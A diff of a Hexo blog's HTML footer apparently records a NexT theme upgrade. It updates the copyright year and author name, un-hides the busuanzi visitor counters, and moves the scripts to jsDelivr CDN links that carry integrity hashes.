-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">素念</span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.2.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
-  </div>
-
-    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-        
 <div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
@@ -516,8 +460,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
@@ -526,59 +469,30 @@
       </span>
     </span>
 </div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
+    </div>
+  </footer>
 
   
-
-
-
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
   
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
 
 
 
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
+
+
+
 
 </body>
 </html>
